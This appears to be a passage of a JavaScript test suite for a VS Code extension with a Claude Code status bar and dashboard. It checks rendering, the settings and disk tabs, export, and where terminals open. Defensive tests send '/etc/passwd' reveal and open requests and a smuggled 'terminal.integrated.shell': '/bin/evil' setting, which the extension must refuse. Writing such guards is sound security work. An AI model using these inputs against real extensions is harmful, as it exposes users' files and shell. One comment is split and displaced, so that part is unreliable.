        state.data.workflows = { runs: [going], active: [going] };

        const provider = vscode.__views.get('claudeStatusline.runsPane');
        assert.ok(provider, 'the view was registered with a provider');

        const [node] = provider.getChildren();
        const item = provider.getTreeItem(node);
        assert.equal(item.label, 'shown');
        assert.equal(item.description, '0/1');
        assert.equal(item.iconPath.id, 'sync~spin');
        assert.equal(item.contextValue, 'run');
        assert.equal(item.collapsibleState, vscode.TreeItemCollapsibleState.Expanded,
            'a run in flight opens itself — it is watched while it happens');

        const [agent] = provider.getChildren(node);
        const agentItem = provider.getTreeItem(agent);
        assert.equal(agentItem.label, '# делай это', 'a live agent is named by its prompt');
        assert.equal(agentItem.collapsibleState, vscode.TreeItemCollapsibleState.None);
        assert.match(String(agentItem.tooltip.value), /\\#/,
            'a prompt is prose out of someone else\'s file, not markup to render');
    } finally { run.dispose(); }
});

// The two things a replay of a failed stage needs — the script to edit and the
// id to resume from — live in the run record and nowhere a user can reach.
test('the run commands are registered and act on a tree node', async () => {
    const run = activate({ segments: ['✻ {weekly}'] });
    const clipboard = vscode.env.clipboard.writeText;
    const show = vscode.window.showTextDocument;
    try {
        const node = { kind: 'run', run: { runId: 'wf_x-1', scriptPath: '/tmp/demo-wf_x-1.js' } };

        assert.ok(vscode.__commands.has('claudeStatusline.copyRunId'));
        assert.ok(vscode.__commands.has('claudeStatusline.openWorkflowScript'));

        let copied = '';
        vscode.env.clipboard.writeText = async (text) => { copied = text; };
        await vscode.__commands.get('claudeStatusline.copyRunId')(node);
        assert.match(copied, /wf_x-1/);
        assert.match(copied, /demo-wf_x-1\.js/);

        const script = path.join(EMPTY_TREE, 'demo-wf_open-1.js');
        fs.writeFileSync(script, 'export const meta = {};\n');
        let shown = '';
        vscode.window.showTextDocument = async (doc) => { shown = doc.uri.fsPath; };
        await vscode.__commands.get('claudeStatusline.openWorkflowScript')({ kind: 'run', run: { runId: 'wf_open-1', scriptPath: script } });
        assert.equal(shown, script, 'the row opens its own script');

        // A run whose script is gone must not throw — the panel outlives the files.
        await vscode.__commands.get('claudeStatusline.openWorkflowScript')({ kind: 'run', run: { runId: 'wf_y', scriptPath: '' } });
        // Neither does one whose path was recorded and has since been deleted.
        await vscode.__commands.get('claudeStatusline.openWorkflowScript')(node);
    } finally {
        vscode.env.clipboard.writeText = clipboard;
        vscode.window.showTextDocument = show;
        run.dispose();
    }
});

// The fast tick draws six times a minute and the slow one rebuilds the whole
// list every minute whether or not anything moved — so a new object is not a
// change, and treating it as one rebuilt 1500 rows a minute for nothing. What
// counts is whether a row would read differently.
test('the tree is redrawn when the runs change, not on every collection', () => {
    const run = activate({ segments: ['{wfRuns}'] });
    try {
        const state = run.context.claudeState;
        const one = () => ({
            runId: 'wf_same', slug: '-p', sessionId: 'sess-1', name: 'same', state: 'running',
            lastActivity: 7, phases: [], agents: [], totals: { agents: 2, done: 1 },
        });
        state.data.workflows = { runs: [one()], active: [one()] };
        ext.__render(state);

        const provider = vscode.__views.get('claudeStatusline.runsPane');
        let fired = 0;
        provider.onDidChangeTreeData(() => { fired += 1; });

        ext.__render(state);
        assert.equal(fired, 0, 'the same object draws no tree');

        // What the slow tick hands over every minute: the same reading, in an
        // object nobody has seen before.
        state.data.workflows = { runs: [one()], active: [one()] };
        ext.__render(state);
        assert.equal(fired, 0, 'and neither does the same reading rebuilt from scratch');

        state.data.workflows = {
            runs: [{ ...one(), totals: { agents: 2, done: 2 } }],
            active: [],
        };
        ext.__render(state);
        assert.equal(fired, 1, 'a row that would read differently does');
    } finally { run.dispose(); }
});

// The bar and the tree are drawn from records this extension did not build, out
// of files a client that ships almost daily writes. render() runs from an
// interval, so an exception there is not one bad frame: every later item stays
// on its old text and the tree is never refreshed again, on every tick, for as
// long as the record survives — and the collector puts it back each minute.
test('one unreadable run does not freeze the bar or the tree', () => {
    const run = activate({ segments: ['[$(gear) {wfName}]', 'plain text'] });
    try {
        const state = run.context.claudeState;
        // A run whose agent has no id at all: every rule that names an agent
        // reaches for one, and this is the shape a format change would take.
        const broken = {
            runId: 'wf_bad', name: 'bad', state: 'running', startedAt: Date.now(),
            phases: [], agents: [{ label: '', state: 'running', promptPreview: '' }],
            totals: { agents: 1, done: 0, cost: 0 },
        };
        state.data.workflows = { runs: [broken], active: [broken] };

        const provider = vscode.__views.get('claudeStatusline.runsPane');
        let fired = 0;
        provider.onDidChangeTreeData(() => { fired += 1; });

        ext.__render(state);

        assert.equal(vscode.__items[0].text, '$(gear) bad', 'the number survives; only its hover is lost');
        assert.equal(String(vscode.__items[0].tooltip), 'Claude — click for the usage dashboard');
        assert.equal(vscode.__items[1].text, 'plain text');
        assert.equal(vscode.__items[1].visible, true, 'and the items after it are still drawn');

        // Nothing about the failure is permanent: the panel draws the next
        // reading it can read, rather than staying dark until a reload.
        const good = {
            runId: 'wf_ok', slug: '-p', sessionId: 'sess-1', name: 'ok', state: 'running',
            lastActivity: 1, phases: [], agents: [], totals: { agents: 1, done: 0 },
        };
        state.data.workflows = { runs: [good], active: [good] };
        ext.__render(state);
        assert.equal(fired, 1, 'the tree comes back on the first reading it can draw');
    } finally { run.dispose(); }
});

// Three tables say how an outcome looks: the tree's icons, the hover's, and the
// stylesheet of the dashboard. The difference between them is legitimate — a
// ThemeIcon, a `$(...)` in markdown, a colour — but the vocabulary is one, and a
// word added to it in one place draws as nothing in the other two.
test('every outcome has an icon in the tree, in the hover and a colour on the page', () => {
    const canonical = Object.keys(wf.OUTCOME_ICONS).sort();
    const styled = [...db.STYLE.matchAll(/\.o-([a-z]+)\s*\{/g)].map((m) => m[1]).sort();

    assert.deepEqual(Object.keys(ext.__AGENT_ICON).sort(), canonical, 'the hover knows every outcome');
    assert.deepEqual(styled, canonical, 'and so does the stylesheet');

    // And the vocabulary really is what those two functions answer with, rather
    // than a constant that drifted away from them.
    const spoken = new Set([
        wf.outcomeOf('done'), wf.outcomeOf('error'), wf.outcomeOf('progress'),
        wf.outcomeOf('progress', 'finished'), wf.outcomeOf('a-word-nobody-has-written'),
        wf.verdictOf({ state: 'running' }).outcome,
        wf.verdictOf({ state: 'abandoned' }).outcome,
        wf.verdictOf({ state: 'finished', status: 'completed' }).outcome,
        wf.verdictOf({ state: 'finished', status: 'killed' }).outcome,
        wf.verdictOf({ state: 'finished', status: '' }).outcome,
    ]);
    assert.deepEqual([...spoken].sort(), canonical);
});

// Re-parsing the index is ~40 ms over 5.6 MB on this machine, and the file only
// changes when the dashboard is opened — a repeating tick has no business paying
// for it every minute.
test('the index is read again only when it has changed', () => {
    const run = activate({ segments: ['{weekly}'] });
    try {
        const state = run.context.claudeState;
        assert.ok(state.index, 'the collector holds an index to price workflows with');
        state.index.__mark = 'kept';

        vscode.__changeConfiguration(); // runs a second slow tick
        assert.equal(state.index.__mark, 'kept', 'nothing changed on disk, nothing re-read');

        ix.saveIndex(run.storage, { version: ix.INDEX_VERSION, files: {} });
        vscode.__changeConfiguration();
        assert.equal(state.index.__mark, undefined, 'a rewritten index is picked up');
    } finally { run.dispose(); }
});

// The landmine this task exists to defuse: both maps are keyed by topic, so a
// topic a field can carry but neither map knows is not a missing tooltip — it
// --- the settings tab -------------------------------------------------------

// The dashboard is opened the way a user opens it — through the command — so
// the panel, its message listener and the handlers behind them are all real.
// The panel outlives activate(): the extension keeps one and reveals it again,
// so each test closes it or the next one finds no listener to talk to.
async function openDashboard() {
    await vscode.__commands.get('claudeStatusline.dashboard')();
    const panel = vscode.__panels[vscode.__panels.length - 1];
    assert.ok(panel && panel.__receive, 'the dashboard must register a message listener');
    return panel;
}

const lastPost = (panel) => panel.webview.posted[panel.webview.posted.length - 1];

// A webview tab wears the generic editor glyph unless the panel is given an
// icon of its own, and the dashboard's own mark is what a reader looks for among
// twenty open tabs. `iconPath` is a property of the panel rather than an option
// of `createWebviewPanel`, which is why it is easy to leave unset.
test('the dashboard tab carries the extension icon', async () => {
    const run = activate({ segments: ['{today}'] });
    let panel;
    try {
        panel = await openDashboard();
        const shown = panel.iconPath && (panel.iconPath.fsPath || panel.iconPath.path || '');
        assert.match(String(shown), /media\/icon\.svg$/);
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

test('the settings tab previews a segment with the same code that draws the bar', async () => {
    const run = activate({ segments: ['{weekly}'] });
    let panel;
    try {
        panel = await openDashboard();
        const state = run.context.claudeState;
        // The limits come from the machine-wide cache rather than the scratch
        // tree, so the expectation is whatever the bar itself would draw right
        // now — the claim under test is that the two agree, not what they say.
        const templates = ['plain text', '7d {weekly}', 'a {model} b'];
        const expected = templates.map((t) => {
            const out = seg.renderSegment(t, state.data, state.registry);
            return out.visible ? out.text : '';
        });

        await panel.__receive({ type: 'preview', segments: templates });
        const reply = lastPost(panel);
        assert.equal(reply.type, 'preview');
        assert.deepEqual(reply.previews.map((p) => p.text), expected);
        assert.equal(reply.previews[0].text, 'plain text');
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

test('asking for the defaults returns the built-in bar, not the current one', async () => {
    const run = activate({ segments: ['mine'] });
    let panel;
    try {
        panel = await openDashboard();
        await panel.__receive({ type: 'defaults' });
        assert.deepEqual(lastPost(panel), { type: 'defaults', segments: seg.DEFAULT_SEGMENTS });
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// The Disk tab offers to open a directory in the file manager. The page is a
// webview: a message asking to reveal a path is only as trustworthy as the guard
// behind it, so the extension opens nothing it did not itself measure and put on
// that page.
test('the disk tab reveals only the directories it measured', async () => {
    // The disk figures are pinned rather than read from this machine: a runner
    // that has never run Claude Code has no ~/.claude, so the tab renders empty
    // and a test written against the real tree passes here and fails there —
    // which is exactly how it failed in CI the first time.
    const realSnapshot = sys.snapshot;
    sys.snapshot = (args) => ({
        ...realSnapshot(args),
        disk: {
            total: 1400,
            dirs: [{ name: 'projects', bytes: 900, kind: 'keep', path: '/fake/claude/projects' }],
            hogs: [{ path: 'jobs/x/tmp', abs: '/fake/claude/jobs/x/tmp', bytes: 500, note: 'scratch of "x"' }],
        },
    });
    const run = activate({ segments: ['{weekly}'] });
    let panel;
    try {
        // Reindex rather than the plain open: the snapshot is cached for an hour
        // in a module variable that earlier tests have already filled, and only
        // a forced rebuild reads the pinned figures above.
        await vscode.__commands.get('claudeStatusline.reindex')();
        panel = vscode.__panels[vscode.__panels.length - 1];
        assert.ok(panel && panel.__receive, 'the dashboard must register a message listener');
        const shown = () => vscode.__executed.filter((e) => e.id === 'revealFileInOS');

        // Any path at all, including one that exists: not on the page, not opened.
        await panel.__receive({ type: 'reveal', path: os.homedir() });
        await panel.__receive({ type: 'reveal', path: '/etc/passwd' });
        await panel.__receive({ type: 'reveal', path: '' });
        assert.deepEqual(shown(), [], 'a path the page never showed is refused');

        // And one the page does offer opens. Taken out of the rendered HTML
        // rather than recomputed here: what the guard admits and what the page
        // shows are the same list, and a test that rebuilt the list itself would
        // pass while the two drifted apart.
        const offered = [...panel.webview.html.matchAll(/data-reveal="([^"]+)"/g)].map((m) => m[1]);
        assert.deepEqual(offered, ['/fake/claude/projects', '/fake/claude/jobs/x/tmp'],
            'both tables offer their directory');
        await panel.__receive({ type: 'reveal', path: offered[0] });
        assert.equal(shown().length, 1);
        assert.equal(shown()[0].args[0].fsPath, offered[0]);
    } finally {
        sys.snapshot = realSnapshot;
        if (panel) panel.dispose();
        run.dispose();
    }
});

// The tooltip and the Now tab are two renderings of one list of sections. The
// wording used to live in extension.js alone; a tab that copied it would have
// been free to drift the moment either side changed.
test('the Now tab and the tooltips are cut from the same sections', async () => {
    const unpin = pinLimits();
    const run = activate({ segments: ['{weekly}'], workspace: '' });
    let panel;
    try {
        panel = await openDashboard();
        const html = panel.webview.html;
        const state = run.context.claudeState;
        const sections = ext.__statusNow(state);

        assert.ok(sections.length > 0, 'the limit cache alone gives at least one section');
        for (const section of sections) {
            assert.ok(html.includes(`data-panel="${section.id}"`), `${section.id} missing from the page`);
            // Every value the tooltip shows is on the page too — same strings,
            // not a paraphrase.
            for (const block of section.blocks) {
                if (block.kind === 'meters' || block.kind === 'parts') {
                    for (const row of block.rows) {
                        for (const cell of [row.label, row.value, row.note, row.figure]) {
                            if (!cell) continue;
                            assert.ok(html.includes(db.esc(cell)), `"${cell}" is in the tooltip but not on the page`);
                        }
                    }
                    // The caption and the sum beside it are the block's own
                    // words and go the same way as its rows.
                    for (const cell of [block.caption, block.figure]) {
                        if (!cell) continue;
                        assert.ok(html.includes(db.esc(cell)), `"${cell}" is in the tooltip but not on the page`);
                    }
                }
                // Every field a gauge actually carries: `headline` is the figure
                // the panel exists for and `sub` the line beside it, and both
                // were unchecked here while the loop read a `label` that the
                // block had stopped having — green about nothing.
                if (block.kind === 'gauge') {
                    for (const cell of [block.headline, block.value, block.sub, ...(block.chips || [])]) {
                        if (!cell) continue;
                        assert.ok(html.includes(db.esc(cell)), `"${cell}" is in the tooltip but not on the page`);
                    }
                }
                if (block.kind === 'pills') {
                    for (const item of block.items || []) {
                        for (const cell of [item.text, item.value]) {
                            if (!cell) continue;
                            assert.ok(html.includes(db.esc(cell)), `"${cell}" is in the tooltip but not on the page`);
                        }
                    }
                }
                if (block.kind === 'band') {
                    const chip = block.chip ? [block.chip.label, block.chip.value, block.chip.tail] : [];
                    for (const cell of [...(block.facts || []), ...chip]) {
                        if (!cell) continue;
                        assert.ok(html.includes(db.esc(cell)), `"${cell}" is in the tooltip but not on the page`);
                    }
                }
                if (block.kind !== 'table') continue;
                for (const row of block.rows) {
                    for (const cell of row) {
                        if (!cell) continue;
                        assert.ok(html.includes(db.esc(cell)), `"${cell}" is in the tooltip but not on the page`);
                    }
                }
            }
        }
    } finally { if (panel) panel.dispose(); run.dispose(); unpin(); }
});

// The page is rebuilt on the same interval as the bar, and a rebuild throws away
// whatever the document held — which is fine for a table and fatal for a form.
test('the open dashboard is rebuilt on the tick, except while settings are open', async () => {
    const run = activate({ segments: ['{weekly}'] });
    let panel;
    try {
        panel = await openDashboard();
        const first = panel.webview.html;

        // A plain tab: the tick redraws the page in place, same panel.
        await panel.__receive({ type: 'tab', id: 'now' });
        await ext.__refreshDashboard(run.context);
        assert.equal(vscode.__panels.length, 1, 'the refresh reuses the panel');
        assert.ok(panel.webview.html.length > 0);

        // The settings editor holds fields the user is typing into; a redraw
        // would discard them, so the refresh does not happen at all.
        await panel.__receive({ type: 'tab', id: 'settings' });
        panel.webview.html = 'SETTINGS-OPEN';
        await ext.__refreshDashboard(run.context);
        assert.equal(panel.webview.html, 'SETTINGS-OPEN', 'a redraw would have wiped the form');

        // The launch tab is a form as well — the alias name is typed there and
        // the button that writes it reads the field, so a redraw between the two
        // hands a shell file a blank.
        await panel.__receive({ type: 'tab', id: 'launch' });
        panel.webview.html = 'LAUNCH-OPEN';
        await ext.__refreshDashboard(run.context);
        assert.equal(panel.webview.html, 'LAUNCH-OPEN', 'a redraw would have wiped the form');

        // Navigating away lets it resume.
        await panel.__receive({ type: 'tab', id: 'overview' });
        await ext.__refreshDashboard(run.context);
        assert.notEqual(panel.webview.html, 'SETTINGS-OPEN');

        // A panel nobody is looking at is not worth an index pass either.
        panel.visible = false;
        panel.webview.html = 'HIDDEN';
        await ext.__refreshDashboard(run.context);
        assert.equal(panel.webview.html, 'HIDDEN');
        assert.ok(first.length > 0);
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// The tick leaves a hidden panel alone, which is right — and left the page a
// reader came back to as old as the moment they left, its countdown stuck past
// zero on "refreshing…" for as long as the tab stayed behind another one.
// Coming back into view is the moment that page is worth rebuilding.
test('a page that missed its ticks while hidden is rebuilt when the tab comes back', async () => {
    const run = activate({ segments: ['{weekly}'], settings: { refreshInterval: 60 } });
    let panel;
    const real = Date.now;
    try {
        panel = await openDashboard();
        await panel.__receive({ type: 'tab', id: 'now' });

        // Away and back inside one interval: the page on screen is still the
        // reading the last tick took, and rebuilding it would cost an index
        // pass for every flick between two editor tabs.
        panel.visible = false;
        await ext.__refreshDashboard(run.context);
        panel.visible = true;
        panel.webview.html = 'FRESH';
        await panel.__viewState();
        assert.equal(panel.webview.html, 'FRESH', 'a page that has not missed a tick is left alone');

        // Hidden across a tick, and the page is stale by exactly the amount the
        // countdown has been sitting past zero.
        panel.visible = false;
        panel.webview.html = 'STALE';
        Date.now = () => real() + 120_000;
        await ext.__refreshDashboard(run.context);
        assert.equal(panel.webview.html, 'STALE', 'the hidden panel still skips its tick');

        panel.visible = true;
        await panel.__viewState();
        assert.notEqual(panel.webview.html, 'STALE', 'coming back into view rebuilds it');
    } finally { Date.now = real; if (panel) panel.dispose(); run.dispose(); }
});

// The settings tab shipped blank: every palette value a dash, every preview
// "hidden", while the bar two inches below was full of numbers. The page read
// the state through a property parked on the ExtensionContext, which the stub
// happily carried and the editor did not. Freezing the context here reproduces
// that exactly — the state has to reach the page some other way.
test('the dashboard reads live numbers even when the context refuses new properties', async () => {
    vscode.__reset();
    vscode.__setSettings({ segments: ['{weekly}'], alignment: 'right', priority: 100, refreshInterval: 3600 });
    const storage = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-frozen-'));
    const context = Object.freeze({
        subscriptions: [],
        globalStorageUri: { fsPath: storage },
        extensionUri: { fsPath: path.join(__dirname, '..'), scheme: 'file' },
    });
    const unpin = pinLimits();

    let panel;
    try {
        ext.activate(context);
        panel = await openDashboard();
        // Whatever the bar is showing must also reach the page.
        const barText = vscode.__items[0].text;
        await panel.__receive({ type: 'preview', segments: ['{weekly}'] });
        assert.equal(lastPost(panel).previews[0].text, barText);
        assert.ok(barText.length > 0, 'the bar itself must have something to show for this to prove anything');

        // And the palette baked into the HTML carries the same value.
        assert.ok(panel.webview.html.includes(`<span class="pal-val">${barText}</span>`),
            'the palette must show the live value, not a dash');
    } finally {
        if (panel) panel.dispose();
        for (const d of context.subscriptions) d.dispose();
        fs.rmSync(storage, { recursive: true, force: true });
        unpin();
    }
});

test('picking a preset fills the editor with that bar and saves nothing', async () => {
    const run = activate({ segments: ['mine'] });
    let panel;
    try {
        panel = await openDashboard();
        const preset = seg.PRESETS.find((p) => p.id === 'minimal');
        await panel.__receive({ type: 'preset', id: preset.id });

        assert.deepEqual(lastPost(panel), { type: 'defaults', segments: preset.segments });
        assert.equal(vscode.__updates.length, 0, 'trying a preset on must not write settings');

        // An id nobody offers is ignored rather than answered with an empty bar.
        const before = panel.webview.posted.length;
        await panel.__receive({ type: 'preset', id: 'no-such-preset' });
        assert.equal(panel.webview.posted.length, before);
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

test('each preset is previewed with what it would say on this machine', async () => {
    const run = activate({ segments: ['mine'] });
    let panel;
    try {
        panel = await openDashboard();
        const state = run.context.claudeState;
        await panel.__receive({ type: 'presetPreviews' });

        const reply = lastPost(panel);
        assert.equal(reply.type, 'presetPreviews');
        assert.deepEqual(Object.keys(reply.previews).sort(), seg.PRESETS.map((p) => p.id).sort());
        for (const preset of seg.PRESETS) {
            const expected = preset.segments.map((t) => {
                const out = seg.renderSegment(t, state.data, state.registry);
                return out.visible ? out.text : '';
            });
            assert.deepEqual(reply.previews[preset.id], expected, `${preset.id} previews as the bar would draw it`);
        }
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

test('saving writes only the settings the extension owns, into the chosen scope', async () => {
    const run = activate({ segments: ['mine'] });
    let panel;
    try {
        panel = await openDashboard();
        await panel.__receive({
            type: 'save',
            scope: 'workspace',
            settings: {
                segments: ['a', 'b'], alignment: 'left', priority: 7, refreshInterval: 30,
                // A key the form never offers: it must not reach the settings file.
                'terminal.integrated.shell': '/bin/evil',
            },
        });

        const written = vscode.__updates;
        assert.deepEqual(written.map((w) => w.key).sort(),
            ['alignment', 'priority', 'refreshInterval', 'segments']);
        assert.ok(written.every((w) => w.target === vscode.ConfigurationTarget.Workspace));
        assert.deepEqual(written.find((w) => w.key === 'segments').value, ['a', 'b']);
        assert.equal(lastPost(panel).type, 'saved');
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

test('saving without a scope goes to the user settings, not the workspace', async () => {
    const run = activate({ segments: ['mine'] });
    let panel;
    try {
        panel = await openDashboard();
        await panel.__receive({ type: 'save', settings: { segments: ['x'] } });
        assert.equal(vscode.__updates[0].target, vscode.ConfigurationTarget.Global);
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

test('the settings tab is handed the live value of every placeholder', async () => {
    const run = activate({ segments: ['{weekly}'] });
    let panel;
    try {
        panel = await openDashboard();
        const html = panel.webview.html;
        // Every registered field appears in the palette, and the editor is
        // seeded with the segments actually in force.
        for (const name of Object.keys(seg.fields({}))) {
            assert.ok(html.includes(`{${name}}`), `${name} missing from the palette`);
        }
        assert.match(html, /data-tab="settings"/);
        assert.match(html, /value="\{weekly\}"/);
        // Every preset is offered by name, with a button that carries its id.
        for (const preset of seg.PRESETS) {
            assert.ok(html.includes(`data-preset="${preset.id}"`), `${preset.id} missing from the menu`);
            assert.ok(html.includes(preset.name), `${preset.name} is not named`);
        }
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// is a throw inside render() that hides every item in the bar, not just its own.
// The list comes from the fields themselves, not from the hand-written constant:
// a field given a topic nobody registered is exactly the way this breaks again.
test('every topic a segment can carry has a tooltip and a colour source', () => {
    const run = activate({ segments: ['{weekly}'] });
    try {
        const state = run.context.claudeState;
        const declared = Object.values(seg.fields({})).map((f) => f.topic);
        for (const topic of new Set([...seg.TOPICS, ...declared])) {
            // A field of that topic with something to say, so render() is forced
            // down the path that looks the topic up in both maps.
            state.registry = { probe: { topic, doc: '', get: () => 'x' } };
            state.segments = ['{probe}'];
            ext.__render(state);
            assert.equal(vscode.__items[0].text, 'x', `topic ${topic} draws`);
            // Visibility is half the assertion: a topic missing from either map
            // throws inside the draw, and a draw that threw hides its item —
            // which is the whole failure this test exists to catch.
            assert.equal(vscode.__items[0].visible, true, `topic ${topic} survives its own draw`);
        }
    } finally { run.dispose(); }
});

// The page hands back a path to open. Only paths the extension itself put on
// the page are honoured — a webview is a document, and a document that can name
// any file on disk is a document that can be made to name the wrong one.
test('the open-file message is refused for a path the page never carried', async () => {
    const run = activate({ segments: ['{weekly}'] });
    let panel;
    try {
        panel = await openDashboard();
        vscode.__errors.length = 0;
        await panel.__receive({ type: 'open', path: '/etc/passwd' });
        assert.deepEqual(vscode.__errors, [], 'a refused path must not even be attempted');
    } finally { if (panel) panel.dispose(); run.dispose(); }
});

// An export is the one place the index leaves the machine's own process, so
// what it writes has to be exactly what the page drew — and a session title
// full of commas and quotes has to survive the trip.
test('export writes the file the user picked, in the shape its name asks for', async () => {
    const run = activate({ segments: ['{weekly}'] });
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ccsl-exp-'));
    try {
        for (const [name, check] of [
            ['out.csv', (t) => t.startsWith('end,project,branch')],
            ['out.json', (t) => JSON.parse(t).exportedAt && Array.isArray(JSON.parse(t).sessions)],
        ]) {
            const target = path.join(dir, name);
            vscode.__setSaveTarget({ fsPath: target });
            await vscode.__commands.get('claudeStatusline.export')();
            assert.ok(fs.existsSync(target), `${name} was not written`);
            assert.ok(check(fs.readFileSync(target, 'utf8')), `${name} is not in its own shape`);
        }

        // Nothing is written when the dialog is dismissed.
        vscode.__setSaveTarget(undefined);
        const before = fs.readdirSync(dir).length;
        await vscode.__commands.get('claudeStatusline.export')();
        assert.equal(fs.readdirSync(dir).length, before);
    } finally { fs.rmSync(dir, { recursive: true, force: true }); run.dispose(); }
});

// A cell that could be misread is quoted: one unescaped quote shifts every
// column after it on that row, and a session title is user text.
test('a csv cell survives commas, quotes and newlines', () => {
    const csv = ix.exportCsv({
        days: {}, models: {}, projects: {}, branches: {}, skills: {}, tools: {},
        sessions: [{ end: 1, project: 'p', title: 'a, "b"\nc', models: ['x', 'y'], cost: 1 }],
    });
    const rows = csv.split('\n');
    assert.match(rows[0], /^end,project,branch/);
    // The quoted cell keeps its newline, so the row spans two lines on purpose.
    assert.match(csv, /"a, ""b""\nc"/);
    assert.match(csv, /x y/);
});

// `autoRefresh` names the expensive work, not one path to it. Three events can
// reach that work — the timer, a settings change and focus returning to the
// window — and the first attempt at this gated only the timer, leaving the other
// two to do the full pass, limits request included, with the switch off.
// `d.limits` is the witness rather than the spend: only collectSlow writes it,
// while `d.now` and the rest are written by the cheap read too — and the spend
// fields need a live session, which a test has none of.
const ranSlow = (state, fire) => {
    state.data.limits = 'SENTINEL';
    fire();
    return state.data.limits !== 'SENTINEL';
};

test('with the timer off, neither focus nor a settings change runs the expensive pass', () => {
    const run = activate({ segments: ['{today}'], settings: { autoRefresh: false, fetchLimits: false } });
    try {
        const state = run.context.claudeState;
        assert.equal(ranSlow(state, () => vscode.__focusWindow(true)), false,
            'coming back to the window is not asking for it');
        assert.equal(ranSlow(state, () => vscode.__changeConfiguration('claudeStatusline.segments')), false,
            'and neither is ticking a checkbox');
    } finally { run.dispose(); }
});

// The same events with the switch on: focus is exactly the "the user is looking
// again" signal the pass exists for.
test('with the timer on, returning to the window runs it', () => {
    const run = activate({ segments: ['{today}'], settings: { autoRefresh: true, fetchLimits: false } });
    try {
        const state = run.context.claudeState;
        assert.equal(ranSlow(state, () => vscode.__focusWindow(true)), true);
    } finally { run.dispose(); }
});

// A timer that is a setting has to survive a settings file written before the
// setting existed: `undefined` means the documented default, which is on.
test('auto-refresh is on unless it was switched off', async () => {
    for (const [autoRefresh, expected] of [[undefined, true], [true, true], [false, false]]) {
        const run = activate({ segments: ['{weekly}'], settings: { autoRefresh } });
        let panel;
        try {
            panel = await openDashboard();
            const before = panel.webview.html;
            await panel.__receive({ type: 'tab', id: 'now' });
            const moved = await ext.__refreshDashboard(run.context);
            assert.equal(moved, expected, `autoRefresh=${autoRefresh} should ${expected ? '' : 'not '}redraw`);
            if (!expected) assert.equal(panel.webview.html, before, 'a page nobody asked to move must not move');
        } finally { if (panel) panel.dispose(); run.dispose(); }
    }
});

// Where the session lands is the whole of this button, and it comes down to one
// argument. Two earlier versions asked Claude Code's own command for it instead:
// its third parameter takes `beside | window | bottom`, which are a split, a
// floating window and the panel, and it reports nothing when a value means
// something other than what was hoped. None of the three is a tab in the group
// being looked at, which is why the terminal is opened here.
const openClaude = () => vscode.__commands.get('claudeStatusline.openClaude')();
const lastTerminal = () => vscode.__terminals[vscode.__terminals.length - 1];

test('the tab button opens the session in the active editor group', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        await openClaude();
        assert.equal(vscode.__terminals.length, 1);
        const terminal = lastTerminal();
        assert.deepEqual(terminal.options.location, { viewColumn: vscode.ViewColumn.Active });
        assert.equal(terminal.options.name, 'Claude Code');
        // Not transient: a reload reconnects to the shell that never stopped, so
        // the session inside the tab goes on running — and installing a build of
        // this extension is a reload. Claude Code's own terminals opt out of that
        // and this one used to copy them, which killed a session per reload.
        assert.equal(terminal.options.isTransient, undefined);
        assert.equal(terminal.shown, 1, 'a tab nobody is shown is not opened');
    } finally { run.dispose(); }
});

// The other three places, each one argument away from the first. They are worth
// a test apiece because none of them is visible from anywhere else: a wrong
// location opens a session all the same, in the wrong half of the window.
test('openLocation puts the session where it names', async () => {
    for (const [openLocation, location] of [
        ['beside', { viewColumn: vscode.ViewColumn.Beside }],
        ['panel', vscode.TerminalLocation.Panel],
        ['newWindow', { viewColumn: vscode.ViewColumn.Active }],
        // Anything else is the default, including a value from a settings file
        // written by hand.
        ['nonsense', { viewColumn: vscode.ViewColumn.Active }],
    ]) {
        const run = activate({ segments: ['{today}'], settings: { openLocation } });
        try {
            await openClaude();
            assert.deepEqual(lastTerminal().options.location, location, openLocation);
        } finally { run.dispose(); }
    }
});

// Where the session lands on disk, which is a different question from where its
// tab lands on screen and a much more expensive one to get wrong: a session's
// cwd decides which CLAUDE.md it reads, which project memory it carries and
// which transcript directory it writes. Left to VS Code — no `cwd` in the
// options — a multi-root window answers `getLastActiveWorkspaceRoot()`, which
// walks the editor history, so the same button would open in whichever repo a
// file was last clicked in. The first folder is the answer Claude Code's own
// extension gives its sidebar sessions, so the two launchers agree.
test('the session opens in the first workspace folder, not wherever the last editor was', async () => {
    const run = activate({ segments: ['{today}'], workspace: ['/container', '/repo-one', '/repo-two'] });
    try {
        await openClaude();
        assert.equal(lastTerminal().options.cwd, '/container');
    } finally { run.dispose(); }
});

// A window with no folder open has no first folder to name, and naming one
// anyway would be worse than saying nothing: VS Code falls back to the home
// directory, which is where a session with no project belongs.
test('with no folder open the cwd is left to VS Code', async () => {
    const run = activate({ segments: ['{today}'] });
    try {
        await openClaude();
        assert.equal(lastTerminal().options.cwd, undefined);
    } finally { run.dispose(); }
});

// A terminal cannot be created in another window, so this one is the odd case:
// opened like the first, then carried out by a command that acts on whatever
// editor is active — which is why the terminal is shown before it runs.
test('a new window is asked for after the terminal is shown, and only for that setting', async () => {
    const moves = () => vscode.__executed.filter((e) => e.id === 'workbench.action.moveEditorToNewWindow');
    let run = activate({ segments: ['{today}'], settings: { openLocation: 'newWindow' } });
    try {
        await openClaude();
        assert.equal(moves().length, 1);
        assert.equal(lastTerminal().shown, 1);
    } finally { run.dispose(); }

    run = activate({ segments: ['{today}'], settings: { openLocation: 'panel' } });
    try {
        await openClaude();
        assert.deepEqual(moves(), [], 'nothing is carried anywhere for the other places');
    } finally { run.dispose(); }
});

// The button says where it will put the session, and that is a setting now — so
// the sentence is built where the button is, on every configuration change.
test('the button hover names the place the setting chose', async () => {
    const tooltipWith = (openLocation) => {
        const run = activate({ segments: ['{today}'], settings: { openLocation } });
        try { return openButtons()[0].tooltip; } finally { run.dispose(); }
    };
    // The words are the Settings tab's, so this asserts against that list rather
    // than against a copy of it written here.
    for (const [key, label] of db.PLACES) {
        assert.equal(tooltipWith(key), `Open Claude Code ${label}`);
    }
    assert.equal(tooltipWith(undefined), tooltipWith('activeGroup'));
});

// Shell integration is the difference between running a command and typing at a
